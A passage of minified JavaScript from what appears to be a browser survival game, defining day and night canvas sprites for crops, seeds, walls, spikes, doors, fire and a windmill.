      sprite[Ie.HERB][Ie.DAY].push(te(at(0.9, 0, ["#0d4f35"], 2)));
      sprite[Ie.HERB][Ie.NIGHT].push(te(at(0.9, 0, ["#053339"], 0)));
      sprite[Ie.HERB][Ie.NIGHT].push(te(at(0.9, 0, ["#053339"], 1)));
      sprite[Ie.HERB][Ie.NIGHT].push(te(at(0.9, 0, ["#053339"], 2)));
      sprite[Ie.HERB][Ie.DAY].push(te(nt(0.8, ["#241301", "#ba6b0e", "#6d3f04"])));
      sprite[Ie.HERB][Ie.DAY].push(te(nt(0.8, ["#292002", "#ba930e", "#6d5704"])));
      sprite[Ie.HERB][Ie.NIGHT].push(te(nt(0.9, ["#052919", "#0a4738", "#06321f"])));
      sprite[Ie.HERB][Ie.NIGHT].push(te(nt(0.8, ["#052918", "#08491c", "#063417"])));
      sprite[Ie.SIGN] = [];
      sprite[Ie.SIGN][Ie.DAY] = te(we(Math.PI / 2, Jt(0.25, true, ["#0d1b1c", "#44301b", "#57442a", "#523e26"])));
      sprite[Ie.SIGN][Ie.NIGHT] = te(we(Math.PI / 2, Jt(0.25, true, ["#030d14", "#082b22", "#0a2f2b", "#072824"])));
      sprite[Ie.SIGN_BUTTON] = [];
      sprite[Ie.SIGN_BUTTON].push(te(Xt(0.25, ["#44301b", "#57442a", "#523e26"], 0)));
      sprite[Ie.SIGN_BUTTON].push(te(Xt(0.25, ["#4f371e", "#624d30", "#5e472c", "#eda80d"], 1)));
      sprite[Ie.SIGN_BUTTON].push(te(Xt(0.25, ["#382715", "#4e3c25", "#473620", "#d7990c"], 2)));
      sprite[Ie.SYMBOLS] = [];
      sprite[Ie.SYMBOLS][Ie.DAY] = [];
      sprite[Ie.SYMBOLS][Ie.NIGHT] = [];
      sprite[Ie.SYMBOLS][Ie.DAY].push(te(we(Math.PI / 2, qt(0.25, 0, ["#0d1b1c", "#44301b", "#57442a", "#523e26", "#9b2b25"], 1))));
      sprite[Ie.SYMBOLS][Ie.NIGHT].push(te(we(Math.PI / 2, qt(0.25, 0, ["#030d14", "#082b22", "#0a2f2b", "#072824", "#9b2b25"], 1))));
      sprite[Ie.SYMBOLS][Ie.DAY].push(te(we(Math.PI / 2, qt(0.25, 0, ["#0d1b1c", "#44301b", "#57442a", "#523e26", "#4f9246"], 2))));
      sprite[Ie.SYMBOLS][Ie.NIGHT].push(te(we(Math.PI / 2, qt(0.25, 0, ["#030d14", "#082b22", "#0a2f2b", "#072824", "#4f9246"], 2))));
      sprite[Ie.SYMBOLS][Ie.DAY].push(te(we(Math.PI / 2, qt(0.25, 0, ["#0d1b1c", "#44301b", "#57442a", "#523e26", "#9b2b25", "#ffffff"], 3))));
      sprite[Ie.SYMBOLS][Ie.NIGHT].push(te(we(Math.PI / 2, qt(0.25, 0, ["#030d14", "#082b22", "#0a2f2b", "#072824", "#9b2b25", "#ffffff"], 3))));
      sprite[Ie.SYMBOLS][Ie.DAY].push(te(we(Math.PI / 2, qt(0.25, 0, ["#0d1b1c", "#44301b", "#57442a", "#523e26", "#9b2b25", "#362513"], 4))));
      sprite[Ie.SYMBOLS][Ie.NIGHT].push(te(we(Math.PI / 2, qt(0.25, 0, ["#030d14", "#082b22", "#0a2f2b", "#072824", "#9b2b25", "#664d2e"], 4))));
      sprite[Ie.PLANT] = [];
      sprite[Ie.PLANT][Ie.DAY] = [te(tt(1.2, true, ["#0e3022", "#0b8052", "#077b49"]))];
      sprite[Ie.PLANT][Ie.NIGHT] = [te(tt(1.2, true, ["#030d14", "#084442", "#0a4049"]))];
      sprite[Ie.DRIED_PLANT] = [];
      sprite[Ie.DRIED_PLANT][Ie.DAY] = te(tt(0.8, true, ["#0e3022", "#68622D", "#665329"]));
      sprite[Ie.DRIED_PLANT][Ie.NIGHT] = te(tt(0.8, true, ["#030d14", "#0F3A24", "#083326"]));
      sprite[Ie.PUMPKIN] = [];
      sprite[Ie.PUMPKIN][Ie.DAY] = te($r(0.5, true, ["#1b170c", "#c67933", "#a6692f", "#bd7533", "#86683e", "#6e502d"]));
      sprite[Ie.PUMPKIN][Ie.NIGHT] = te($r(0.5, true, ["#030d14", "#0a3429", "#0a2f2b", "#082f25", "#082925", "#0a3630"]));
      sprite[Ie.GARLIC] = [];
      sprite[Ie.GARLIC][Ie.DAY] = te(Ye(0.5, true, ["#1b170c", "#e8e8e8", "#d2cfcf", "#e0e1e0", "#c4c4c4"]));
      sprite[Ie.GARLIC][Ie.NIGHT] = te(Ye(0.5, true, ["#030d14", "#2b5254", "#264a46", "#396260", "#244743"]));
      sprite[Ie.THORNBUSH] = [];
      sprite[Ie.THORNBUSH][Ie.DAY] = te(en(0.5, true, ["#1b170c", "#349970", "#245c45", "#348361", "#e8e8e8", "#bbbbbb"]));
      sprite[Ie.THORNBUSH][Ie.NIGHT] = te(en(0.5, true, ["#030d14", "#0d5551", "#074440", "#0f5c58", "#4e8784", "#3f7572"]));
      sprite[Ie.PLANT_MINI] = [];
      sprite[Ie.PLANT_MINI][Ie.DAY] = te(tt(0.8, true, ["#1b170c", "#0b8052", "#077b49"]));
      sprite[Ie.PLANT_MINI][Ie.NIGHT] = te(tt(0.8, true, ["#030d14", "#084442", "#0a4049"]));
      sprite[Ie.DRIED_PUMPKIN] = [];
      sprite[Ie.DRIED_PUMPKIN][Ie.DAY] = te($r(0.5, true, ["#1b170c", "#68622D", "#665329", "#5e5823", "#86683e", "#6e502d"]));
      sprite[Ie.DRIED_PUMPKIN][Ie.NIGHT] = te($r(0.5, true, ["#030d14", "#0F3A24", "#083326", "#0c301e", "#062a1f", "#083b2b"]));
      sprite[Ie.DRIED_GARLIC] = [];
      sprite[Ie.DRIED_GARLIC][Ie.DAY] = te(Ye(0.5, true, ["#1b170c", "#adbe9e", "#7e9178", "#84aa84", "#527556"]));
      sprite[Ie.DRIED_GARLIC][Ie.NIGHT] = te(Ye(0.5, true, ["#030d14", "#164a44", "#124244", "#13373b", "#133e3e"]));
      sprite[Ie.DRIED_THORNBUSH] = [];
      sprite[Ie.DRIED_THORNBUSH][Ie.DAY] = te(en(0.5, true, ["#1b170c", "#7a9160", "#4a5e3c", "#637e5a", "#c5cfc0", "#8a9685"]));
      sprite[Ie.DRIED_THORNBUSH][Ie.NIGHT] = te(en(0.5, true, ["#030d14", "#3e5d5b", "#2f4442", "#354e4c", "#637d7c", "#556b6a"]));
      sprite[Ie.GIFT] = [];
      sprite[Ie.GIFT][Ie.DAY] = te(On(0.45, true, ["#0e3022", "#ac222a", "#98171e", "#22a84f", "#1f924a"]));
      sprite[Ie.GIFT][Ie.NIGHT] = te(On(0.45, true, ["#0e3022", "#19386e", "#0b2752", "#124252", "#0d3441"]));
      sprite[Ie.HURT_GIFT] = te(On(0.65, true, ["rgba(14, 48, 34, 0)", "#BB0000", "#BB0000", "#BB0000", "#BB0000"]));
      sprite[Ie.FRUIT] = [];
      sprite[Ie.FRUIT][Ie.DAY] = te(rt(1.4, 0, ["#ac222a", "#e6636a"]));
      sprite[Ie.FRUIT][Ie.NIGHT] = te(rt(1.4, 0, ["#46195e", "#744188"]));
      sprite[Ie.FIRE] = [];
      sprite[Ie.FIRE][Ie.DAY] = te(gi(0.9, 0, ["#efd435", "#ec8d35", "#e96132"]));
      sprite[Ie.FIRE][Ie.NIGHT] = te(gi(0.9, 0, ["#efdb7b", "#efe854", "#e8ef62"]));
      sprite[Ie.BIG_FIRE_WOOD] = [];
      sprite[Ie.BIG_FIRE_WOOD][Ie.DAY] = te(Ri(0.9, 0, ["#4d2d14", "#432516"]));
      sprite[Ie.BIG_FIRE_WOOD][Ie.NIGHT] = te(Ri(0.9, 0, ["#282404", "#0a0a01"]));
      sprite[Ie.WOOD_FIRE] = [];
      sprite[Ie.WOOD_FIRE][Ie.DAY] = te(Ci(0.9, 0, ["#4d2d14", "#432516"]));
      sprite[Ie.WOOD_FIRE][Ie.NIGHT] = te(Ci(0.9, 0, ["#282404", "#0a0a01"]));
      sprite[Ie.HALO_FIRE] = [];
      sprite[Ie.HALO_FIRE][Ie.DAY] = te(bi(0.9, 0, ["#efd435"]));
      sprite[Ie.HALO_FIRE][Ie.NIGHT] = te(bi(0.9, 0, ["#fffabb"]));
      sprite[Ie.GROUND_FIRE] = [];
      sprite[Ie.GROUND_FIRE][Ie.DAY] = te(Ni(0.9, 0, ["#efd435"]));
      sprite[Ie.GROUND_FIRE][Ie.NIGHT] = te(Ni(0.9, 0, ["#fffabb"]));
      sprite[Ie.HALO_FIRE_PUMPKIN] = [];
      sprite[Ie.HALO_FIRE_PUMPKIN][Ie.DAY] = te(bi(0.9, 0, ["#efd435"]));
      sprite[Ie.HALO_FIRE_PUMPKIN][Ie.NIGHT] = te(bi(0.9, 0, ["rgba(255, 84, 0, 1)"]));
      sprite[Ie.GROUND_FIRE_PUMPKIN] = [];
      sprite[Ie.GROUND_FIRE_PUMPKIN][Ie.DAY] = te(Ni(0.9, 0, ["#efd435"]));
      sprite[Ie.GROUND_FIRE_PUMPKIN][Ie.NIGHT] = te(Ni(0.9, 0, ["#ff5704"]));
      sprite[Ie.GEAR] = te(ti(1, "#ffffff"));
      sprite[Ie.GEAR2] = te(ti(1.5, "#ffffff"));
      sprite[Ie.YOUR_SCORE] = te(Zi(1, "Your score:", 15, "#FFF"));
      sprite[Ie.WINDMILL_CASES] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 243;
        t.height = e * 172;
        ze(r, e * 119.5, e * 140.125, e * 19);
        ye(r, undefined, i[1], e * 5);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 36.5, e * 20.125);
        r.bezierCurveTo(e * 119.5, e * 20.625, e * 119.5, e * 20.625, e * 202.5, e * 21.125);
        r.bezierCurveTo(e * 214.5, e * 22.125, e * 216.5, e * 26.125, e * 217.5, e * 35.125);
        r.bezierCurveTo(e * 221, e * 76.125, e * 221, e * 76.125, e * 224.5, e * 117.125);
        r.bezierCurveTo(e * 225.5, e * 127.125, e * 221.5, e * 131.125, e * 210.5, e * 132.125);
        r.bezierCurveTo(e * 117.5, e * 132.125, e * 117.5, e * 132.125, e * 24.5, e * 132.125);
        r.bezierCurveTo(e * 14.5, e * 131.125, e * 13.5, e * 126.125, e * 16.5, e * 111.125);
        r.bezierCurveTo(e * 19.5, e * 73.125, e * 19.5, e * 73.125, e * 22.5, e * 35.125);
        r.bezierCurveTo(e * 23.5, e * 23.125, e * 29.5, e * 21.125, e * 36.5, e * 20.125);
        r.closePath();
        ye(r, i[0], i[1], e * 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 15.5, e * 138.625);
        r.bezierCurveTo(e * 120, e * 138.625, e * 120, e * 138.625, e * 224.5, e * 138.625);
        r.closePath();
        ye(r, undefined, i[2], e * 10);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 13.5, e * 131.625);
        r.bezierCurveTo(e * 119.5, e * 131.625, e * 119.5, e * 131.625, e * 225.5, e * 131.625);
        r.closePath();
        ye(r, undefined, i[3], e * 10);
        ze(r, e * 119.5, e * 140.125, e * 14.866068747318506);
        ye(r, i[4], i[5], e * 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 106.5, e * 146.625);
        r.bezierCurveTo(e * 116.5, e * 137.625, e * 118.5, e * 136.625, e * 123.5, e * 138.625);
        r.bezierCurveTo(e * 131.5, e * 145.625, e * 133.5, e * 148.625, e * 127.5, e * 152.625);
        r.bezierCurveTo(e * 115.5, e * 158.625, e * 111.5, e * 153.625, e * 106.5, e * 147.625);
        r.closePath();
        ye(r, i[6], i[7], e * 2);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 105.5, e * 146.625);
        r.bezierCurveTo(e * 116.5, e * 159.625, e * 124.5, e * 156.625, e * 132.5, e * 146.625);
        ye(r, undefined, i[8], e * 5);
        r.save();
        r.translate(e * 75.5, e * 80.125);
        Be(r, e * -39, e * -40, e * 78, e * 78, e * 10);
        r.restore();
        ye(r, i[9]);
        r.save();
        r.translate(e * 167, e * 80.125);
        Be(r, e * -38.5, e * -39, e * 78, e * 78, e * 10);
        r.restore();
        ye(r, i[9]);
        return t;
      }(0.9, ["#596560", "#394841", "#543B1C", "#694D28", "#4D3C1A", "#694D28", "#DEE2E0", "#CDCCCC", "#7B5A31", "#7E8A85"]));
      sprite[Ie.EXTRACTOR_CASES] = IMAGES.EXTRACTOR_CASES;
      sprite[Ie.WINDMILL] = [];
      sprite[Ie.WINDMILL][Ie.DAY] = te(hi(1.5, true, ["#0d1b1c", "#596560", "#394841", "#67766F", "#46554D", "#4C3B19", "#674C2A", "#7C5A29", "#596560", "#394841"]));
      sprite[Ie.WINDMILL][Ie.NIGHT] = te(hi(1.5, true, ["#030d14", "#163A3A", "#214C4B", "#1a4545", "#225755", "#07393D", "#07454a", "#0c484d", "#163A3A", "#214C4B"]));
      sprite[Ie.WINDMILL_WINGS] = [];
      sprite[Ie.WINDMILL_WINGS][Ie.DAY] = te(Ii(2, true, ["#0d1b1c", "#596560", "#394841", "#67766F", "#46554D", "#4C3B19", "#674C2A", "#7C5A29", "#596560", "#394841"]));
      sprite[Ie.WINDMILL_WINGS][Ie.NIGHT] = te(Ii(2, true, ["#030d14", "#163A3A", "#214C4B", "#1a4545", "#225755", "#07393D", "#07454a", "#0c484d", "#163A3A", "#214C4B"]));
      sprite[Ie.WINDMILL_HEAD] = [];
      sprite[Ie.WINDMILL_HEAD][Ie.DAY] = te(ui(1.5, true, ["#0d1b1c", "#596560", "#394841", "#67766F", "#46554D", "#4C3B19", "#674C2A", "#7C5A29", "#596560", "#394841"]));
      sprite[Ie.WINDMILL_HEAD][Ie.NIGHT] = te(ui(1.5, true, ["#030d14", "#163A3A", "#214C4B", "#1a4545", "#225755", "#07393D", "#07454a", "#0c484d", "#163A3A", "#214C4B"]));
      sprite[Ie.WILD_WHEAT] = [];
      sprite[Ie.WILD_WHEAT][Ie.DAY] = te(di(2.2, 0, ["#A89F67", "#9E8456"]));
      sprite[Ie.WILD_WHEAT][Ie.NIGHT] = te(di(2.2, 0, ["#0B4049", "#08383D"]));
      sprite[Ie.DRIED_WHEAT] = [];
      sprite[Ie.DRIED_WHEAT][Ie.DAY] = te(di(2.2, 0, ["#68622D", "#665329"]));
      sprite[Ie.DRIED_WHEAT][Ie.NIGHT] = te(di(2.2, 0, ["#0F3A24", "#083326"]));
      sprite[Ie.WHEAT_MOB] = [];
      sprite[Ie.WHEAT_MOB][Ie.DAY] = te(ji(0.8, 0, ["#A89F67", "#9E8456"]));
      sprite[Ie.WHEAT_MOB][Ie.NIGHT] = te(ji(0.8, 0, ["#15514F", "#0F3F3D"]));
      sprite[Ie.PUMPKIN_SEED_MOB] = [];
      sprite[Ie.PUMPKIN_SEED_MOB][Ie.DAY] = te(ji(0.8, 0, ["#c67933", "#b17238"]));
      sprite[Ie.PUMPKIN_SEED_MOB][Ie.NIGHT] = te(ji(0.8, 0, ["#043c37", "#032b23"]));
      sprite[Ie.ALOE_VERA_SEED_MOB] = [];
      sprite[Ie.ALOE_VERA_SEED_MOB][Ie.DAY] = te(ji(0.8, 0, ["#3a8214", "#4a9c1e"]));
      sprite[Ie.ALOE_VERA_SEED_MOB][Ie.NIGHT] = te(ji(0.8, 0, ["#032d29", "#044640"]));
      sprite[Ie.GARLIC_SEED_MOB] = [];
      sprite[Ie.GARLIC_SEED_MOB][Ie.DAY] = te(ji(0.8, 0, ["#e8e8e8", "#bbbbbb"]));
      sprite[Ie.GARLIC_SEED_MOB][Ie.NIGHT] = te(ji(0.8, 0, ["#1c6161", "#07413f"]));
      sprite[Ie.THORNBUSH_SEED_MOB] = [];
      sprite[Ie.THORNBUSH_SEED_MOB][Ie.DAY] = te(ji(0.8, 0, ["#328a56", "#449573"]));
      sprite[Ie.THORNBUSH_SEED_MOB][Ie.NIGHT] = te(ji(0.8, 0, ["#043c37", "#032b23"]));
      sprite[Ie.CARROT_SEED_MOB] = [];
      sprite[Ie.CARROT_SEED_MOB][Ie.DAY] = te(ji(0.8, 0, ["#c98e2f", "#a36b11"]));
      sprite[Ie.CARROT_SEED_MOB][Ie.NIGHT] = te(ji(0.8, 0, ["#043c37", "#032b23"]));
      sprite[Ie.TOMATO_SEED_MOB] = [];
      sprite[Ie.TOMATO_SEED_MOB][Ie.DAY] = te(ji(0.8, 0, ["#b22419", "#99110e"]));
      sprite[Ie.TOMATO_SEED_MOB][Ie.NIGHT] = te(ji(0.8, 0, ["#04323c", "#03222b"]));
      sprite[Ie.WATERMELON_SEED_MOB] = [];
      sprite[Ie.WATERMELON_SEED_MOB][Ie.DAY] = te(ji(0.8, 0, ["#13a56d", "#098a58"]));
      sprite[Ie.WATERMELON_SEED_MOB][Ie.NIGHT] = te(ji(0.8, 0, ["#043c37", "#032b23"]));
      sprite[Ie.WINDMILL_WHEAT_SEED] = ci(1, [{
        f: di,
        x: 0,
        y: 0,
        a: 1,
        r: 0,
        c: ["#A89F67", "#9E8456"]
      }], 1.2, ["#d2c77b", "#e7dc8f", "#bfb360"], 0.7);
      sprite[Ie.BREAD_OVEN_WOOD] = ci(1, [{
        f: Ci,
        x: 0,
        y: 0,
        a: 1,
        r: -Math.PI / 5,
        c: ["#4d2d14", "#432516"]
      }], 0.3, ["#d2c77b", "#e7dc8f", "#bfb360"], 0.7);
      sprite[Ie.BREAD_OVEN_BREAD] = ci(1, [{
        f: Kr,
        x: 0,
        y: -5,
        a: 1,
        r: 0,
        c: ["#1d051e", "#bf8d51", "#7d5133", "#e8d6bf", "#e0c8a9", "#ab7a3f"]
      }], 0.15, ["#d2c77b", "#e7dc8f", "#bfb360"], 0.7);
      sprite[Ie.EMPTY_SLOT] = ci(0.9, [], 0.3, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
      sprite[Ie.PLANT_SEED] = [];
      sprite[Ie.PLANT_SEED][Ie.DAY] = te(Qe(0.9, 0, ["#7d613e", "#9e7e5a"]));
      sprite[Ie.PLANT_SEED][Ie.NIGHT] = te(Qe(0.9, 0, ["#084442", "#125e5a"]));
      sprite[Ie.WHEAT_SEED] = [];
      sprite[Ie.WHEAT_SEED][Ie.DAY] = te(Qe(0.9, 0, ["#9E8456", "#A89F67"]));
      sprite[Ie.WHEAT_SEED][Ie.NIGHT] = te(Qe(0.9, 0, ["#1b6f6a", "#0d4e4c"]));
      sprite[Ie.WHEAT_SEED_DRIED] = [];
      sprite[Ie.WHEAT_SEED_DRIED][Ie.DAY] = te(Qe(0.9, 0, ["#665329", "#68622D"]));
      sprite[Ie.WHEAT_SEED_DRIED][Ie.NIGHT] = te(Qe(0.9, 0, ["#083326", "#0F3A24"]));
      sprite[Ie.PLANT_PUMPKIN] = [];
      sprite[Ie.PLANT_PUMPKIN][Ie.DAY] = te(Qe(0.9, 0, ["#c67933", "#ec952d"]));
      sprite[Ie.PLANT_PUMPKIN][Ie.NIGHT] = te(Qe(0.9, 0, ["#0e6553", "#094437"]));
      sprite[Ie.PLANT_ALOE_VERA] = [];
      sprite[Ie.PLANT_ALOE_VERA][Ie.DAY] = te(Qe(0.9, 0, ["#375809", "#4b770e"]));
      sprite[Ie.PLANT_ALOE_VERA][Ie.NIGHT] = te(Qe(0.9, 0, ["#09542d", "#0d5d2f"]));
      sprite[Ie.PLANT_ALOE_VERA_DRIED] = [];
      sprite[Ie.PLANT_ALOE_VERA_DRIED][Ie.DAY] = te(Qe(0.9, 0, ["#585809", "#72770e"]));
      sprite[Ie.PLANT_ALOE_VERA_DRIED][Ie.NIGHT] = te(Qe(0.9, 0, ["#295209", "#305d0d"]));
      sprite[Ie.PLANT_GARLIC] = [];
      sprite[Ie.PLANT_GARLIC][Ie.DAY] = te(Qe(0.9, 0, ["#b9b094", "#e2d2c0"]));
      sprite[Ie.PLANT_GARLIC][Ie.NIGHT] = te(Qe(0.9, 0, ["#126366", "#0d484b"]));
      sprite[Ie.PLANT_THORNBUSH] = [];
      sprite[Ie.PLANT_THORNBUSH][Ie.DAY] = te(Qe(0.9, 0, ["#3f8662", "#30915d"]));
      sprite[Ie.PLANT_THORNBUSH][Ie.NIGHT] = te(Qe(0.9, 0, ["#0e6553", "#094437"]));
      sprite[Ie.PLANT_PUMPKIN_DRIED] = [];
      sprite[Ie.PLANT_PUMPKIN_DRIED][Ie.DAY] = te(Qe(0.9, 0, ["#c79153", "#dfa868"]));
      sprite[Ie.PLANT_PUMPKIN_DRIED][Ie.NIGHT] = te(Qe(0.9, 0, ["#073927", "#075040"]));
      sprite[Ie.PLANT_GARLIC_DRIED] = [];
      sprite[Ie.PLANT_GARLIC_DRIED][Ie.DAY] = te(Qe(0.9, 0, ["#768b5b", "#819984"]));
      sprite[Ie.PLANT_GARLIC_DRIED][Ie.NIGHT] = te(Qe(0.9, 0, ["#0c4540", "#0e5153"]));
      sprite[Ie.PLANT_THORNBUSH_DRIED] = [];
      sprite[Ie.PLANT_THORNBUSH_DRIED][Ie.DAY] = te(Qe(0.9, 0, ["#567465", "#627c6e"]));
      sprite[Ie.PLANT_THORNBUSH_DRIED][Ie.NIGHT] = te(Qe(0.9, 0, ["#073927", "#075040"]));
      sprite[Ie.PLANT_CARROT] = [];
      sprite[Ie.PLANT_CARROT][Ie.DAY] = te(Qe(0.9, 0, ["#996b3a", "#bf956b"]));
      sprite[Ie.PLANT_CARROT][Ie.NIGHT] = te(Qe(0.9, 0, ["#0e6553", "#094437"]));
      sprite[Ie.PLANT_CARROT_DRIED] = [];
      sprite[Ie.PLANT_CARROT_DRIED][Ie.DAY] = te(Qe(0.9, 0, ["#7a634a", "#a68f77"]));
      sprite[Ie.PLANT_CARROT_DRIED][Ie.NIGHT] = te(Qe(0.9, 0, ["#1e4d43", "#113c32"]));
      sprite[Ie.PLANT_TOMATO] = [];
      sprite[Ie.PLANT_TOMATO][Ie.DAY] = te(Qe(0.9, 0, ["#99403c", "#bc796c"]));
      sprite[Ie.PLANT_TOMATO][Ie.NIGHT] = te(Qe(0.9, 0, ["#1e434d", "#11303c"]));
      sprite[Ie.PLANT_TOMATO_DRIED] = [];
      sprite[Ie.PLANT_TOMATO_DRIED][Ie.DAY] = te(Qe(0.9, 0, ["#88504e", "#b3857c"]));
      sprite[Ie.PLANT_TOMATO_DRIED][Ie.NIGHT] = te(Qe(0.9, 0, ["#253b41", "#162930"]));
      sprite[Ie.PLANT_WATERMELON] = [];
      sprite[Ie.PLANT_WATERMELON][Ie.DAY] = te(Qe(0.9, 0, ["#0f8870", "#23af93"]));
      sprite[Ie.PLANT_WATERMELON][Ie.NIGHT] = te(Qe(0.9, 0, ["#032829", "#083233"]));
      sprite[Ie.PLANT_WATERMELON_DRIED] = [];
      sprite[Ie.PLANT_WATERMELON_DRIED][Ie.DAY] = te(Qe(0.9, 0, ["#618a20", "#84a74e"]));
      sprite[Ie.PLANT_WATERMELON_DRIED][Ie.NIGHT] = te(Qe(0.9, 0, ["#1f4632", "#335d47"]));
      sprite[Ie.WORKBENCH] = [];
      sprite[Ie.WORKBENCH][Ie.DAY] = te(ni(1.2, true, ["#0d1b1c", "#4d2d14", "#432516", "#756e52", "#663f22", "#9e9577"]));
      sprite[Ie.WORKBENCH][Ie.NIGHT] = te(ni(1.2, true, ["#030d14", "#0d2e33", "#072322", "#3e706b", "#123d3f", "#4e827c"]));
      sprite[Ie.WALL] = [];
      sprite[Ie.WALL][Ie.DAY] = te(dt(1, true, ["#0d1b1c", "#4c3a15", "#634828", "#564021", "#634828", "#4c3a15"]));
      sprite[Ie.WALL][Ie.NIGHT] = te(dt(1, true, ["#030d14", "#0d2e33", "#184747", "#123b3f", "#0d2e33", "#174444"]));
      sprite[Ie.DIAMOND_WALL] = [];
      sprite[Ie.DIAMOND_WALL][Ie.DAY] = te(ht(1, true, ["#0d1b1c", "#5cc5ce", "#89d1d4", "#86d0d1", "#95d5d8", "#e0f2f6", "#b3e0e3"]));
      sprite[Ie.DIAMOND_WALL][Ie.NIGHT] = te(ht(1, true, ["#030d14", "#2b9390", "#43b5af", "#43b5af", "#4bbcb4", "#83ddd4", "#59c9c0"]));
      sprite[Ie.AMETHYST_WALL] = [];
      sprite[Ie.AMETHYST_WALL][Ie.DAY] = te(lt(1, true, ["#0d1b1c", "#b15ecf", "#8c29aa", "#c26de0", "#af59cd", "#d588f1"]));
      sprite[Ie.AMETHYST_WALL][Ie.NIGHT] = te(lt(1, true, ["#030d14", "#8359d3", "#764eb5", "#8f65de", "#7f55cc", "#9d77e6"]));
      sprite[Ie.STONE_WALL] = [];
      sprite[Ie.STONE_WALL][Ie.DAY] = te(lt(1, true, ["#0d1b1c", "#6a7570", "#939995", "#9baaa3", "#adbcb5", "#8a938e"]));
      sprite[Ie.STONE_WALL][Ie.NIGHT] = te(lt(1, true, ["#030d14", "#163a3a", "#214c4b", "#1f4948", "#295957", "#1f5955"]));
      sprite[Ie.GOLD_WALL] = [];
      sprite[Ie.GOLD_WALL][Ie.DAY] = te(Ot(1, true, ["#0d1b1c", "#877d36", "#a08f47", "#a7983c", "#b29e4d", "#c1b06b"]));
      sprite[Ie.GOLD_WALL][Ie.NIGHT] = te(Ot(1, true, ["#030d14", "#1f4948", "#215e55", "#1f6058", "#2a7773", "#2c7a70"]));
      sprite[Ie.SPIKE] = [];
      sprite[Ie.SPIKE][Ie.DAY] = te(Kt(0.8, true, ["#0d1b1c", "#5f6061", "#939393", "#4c3a15", "#634828", "#564021", "#634828", "#4c3a15"]));
      sprite[Ie.SPIKE][Ie.NIGHT] = te(Kt(0.8, true, ["#030d14", "#1f343f", "#485e66", "#0d2e33", "#184747", "#123b3f", "#0d2e33", "#174444"]));
      sprite[Ie.GOLD_SPIKE] = [];
      sprite[Ie.GOLD_SPIKE][Ie.DAY] = te(Yt(0.8, true, ["#0d1b1c", "#69685a", "#9c9683", "#877d36", "#a08f47", "#a7983c", "#b29e4d", "#c1b06b"]));
      sprite[Ie.GOLD_SPIKE][Ie.NIGHT] = te(Yt(0.8, true, ["#030d14", "#1a3732", "#1e544c", "#1f4948", "#215e55", "#1f6058", "#2a7773", "#2c7a70"]));
      sprite[Ie.DIAMOND_SPIKE] = [];
      sprite[Ie.DIAMOND_SPIKE][Ie.DAY] = te(kt(0.8, true, ["#0d1b1c", "#7d8b90", "#9facaa", "#5cc5ce", "#89d1d4", "#86d0d1", "#95d5d8", "#e0f2f6", "#b3e0e3"]));
      sprite[Ie.DIAMOND_SPIKE][Ie.NIGHT] = te(kt(0.8, true, ["#030d14", "#2c4b55", "#546d77", "#2b9390", "#43b5af", "#43b5af", "#4bbcb4", "#83ddd4", "#59c9c0"]));
      sprite[Ie.STONE_SPIKE] = [];
      sprite[Ie.STONE_SPIKE][Ie.DAY] = te(Ut(0.8, true, ["#0d1b1c", "#6a7570", "#939393", "#6a7570", "#939995", "#9baaa3", "#adbcb5", "#8a938e"]));
      sprite[Ie.STONE_SPIKE][Ie.NIGHT] = te(Ut(0.8, true, ["#030d14", "#1f343f", "#485e66", "#163a3a", "#214c4b", "#1f4948", "#295957", "#1f5955"]));
      sprite[Ie.AMETHYST_SPIKE] = [];
      sprite[Ie.AMETHYST_SPIKE][Ie.DAY] = te(Ut(0.8, true, ["#0d1b1c", "#6a7570", "#939393", "#b15ecf", "#8c29aa", "#c26de0", "#af59cd", "#d588f1"]));
      sprite[Ie.AMETHYST_SPIKE][Ie.NIGHT] = te(Ut(0.8, true, ["#030d14", "#1f343f", "#485e66", "#8359d3", "#764eb5", "#8f65de", "#7f55cc", "#9d77e6"]));
      sprite[Ie.DOOR_WOOD_CLOSE] = [];
      sprite[Ie.DOOR_WOOD_CLOSE][Ie.DAY] = te(ct(1.5, true, ["#0d1b1c", "#4c3b19", "#574122", "#644928", "#574122", "#735534", "#23a54e", "#1f934a", "#208e48", "#b12c2a", "#9c2625", "#ebd6a4", "#cca73f"]));
      sprite[Ie.DOOR_WOOD_CLOSE][Ie.NIGHT] = te(ct(1.5, true, ["#030d14", "#0d2e33", "#184747", "#123b3f", "#0d2e33", "#174444"]));
      sprite[Ie.DOOR_WOOD_OPEN] = [];
      sprite[Ie.DOOR_WOOD_OPEN][Ie.DAY] = te(ct(1, false, ["#133a2b", "#133a2b", "#1a4935", "#1a4935", "#133a2b", "#1a4935"]));
      sprite[Ie.DOOR_WOOD_OPEN][Ie.NIGHT] = te(ct(1, false, ["#042b30", "#042b30", "#0b342b", "#0b342b", "#042b30", "#0b342b"]));
      sprite[Ie.DOOR_STONE_CLOSE] = [];
      sprite[Ie.DOOR_STONE_CLOSE][Ie.DAY] = te(Rt(1.5, true, ["#0d1b1c", "#6a7570", "#939995", "#9baaa3", "#8a938e", "#adbcb5"]));
      sprite[Ie.DOOR_STONE_CLOSE][Ie.NIGHT] = te(Rt(1.5, true, ["#030d14", "#163a3a", "#214c4b", "#1f4948", "#164542", "#295957"]));
      sprite[Ie.DOOR_STONE_OPEN] = [];
      sprite[Ie.DOOR_STONE_OPEN][Ie.DAY] = te(Rt(1, false, ["#133a2b", "#133a2b", "#1a4935", "#1a4935", "#133a2b", "#1a4935"]));
      sprite[Ie.DOOR_STONE_OPEN][Ie.NIGHT] = te(Rt(1, false, ["#032428", "#032428", "#07393d", "#07393d", "#032428", "#07393d"]));
      sprite[Ie.DOOR_AMETHYST_CLOSE] = [];
      sprite[Ie.DOOR_AMETHYST_CLOSE][Ie.DAY] = te(Rt(1.5, true, ["#0d1b1c", "#b15ecf", "#8c29aa", "#c26de0", "#af59cd", "#d588f1"]));
